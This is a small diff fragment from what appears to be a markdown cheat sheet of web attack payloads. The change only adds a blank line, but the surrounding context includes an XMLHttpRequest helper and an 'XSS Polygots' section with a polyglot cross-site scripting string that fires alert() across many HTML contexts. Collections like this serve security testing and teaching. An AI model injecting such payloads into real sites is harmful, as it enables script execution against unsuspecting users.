@@ -205,6 +205,7 @@ xmlGttp.send(null)
 return xmlHttp.responseText;
 }
 ```
+
 - **XSS Polygots**
 ```jsx
 javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*<svg/*/onload=alert()//>
